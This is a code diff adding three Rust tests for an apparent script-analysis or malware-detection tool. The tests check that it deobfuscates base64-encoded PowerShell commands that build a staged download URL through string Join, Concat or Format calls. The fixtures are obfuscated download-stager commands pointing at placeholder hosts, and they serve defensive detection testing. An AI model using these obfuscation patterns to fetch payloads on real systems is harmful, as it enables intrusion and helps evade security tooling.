@@ -10823,6 +10823,78 @@ if ($finalScript -ne $null) {{
             report.traits
         );
     }
+
+    #[test]
+    fn ps1_string_join_static_resolves_url() {
+        use base64::Engine;
+        let inner = r#"Invoke-WebRequest -Uri ([string]::Join('', @('https://','ps-string-join.example','/stage')))"#;
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-string-join.example/stage"
+            )
+        });
+        assert!(
+            has,
+            "PowerShell [string]::Join URL was not deobfuscated: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn ps1_string_concat_static_resolves_url() {
+        use base64::Engine;
+        let inner = r#"Invoke-WebRequest -Uri ([string]::Concat('https://','ps-string-concat.example','/stage'))"#;
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-string-concat.example/stage"
+            )
+        });
+        assert!(
+            has,
+            "PowerShell [string]::Concat URL was not deobfuscated: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn ps1_string_format_static_resolves_url() {
+        use base64::Engine;
+        let inner = r#"Invoke-WebRequest -Uri ([string]::Format('{0}{1}{2}', 'https://', 'ps-string-format.example', '/stage'))"#;
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-string-format.example/stage"
+            )
+        });
+        assert!(
+            has,
+            "PowerShell [string]::Format URL was not deobfuscated: {:?}",
+            report.traits
+        );
+    }
 }
 
 #[cfg(test)]
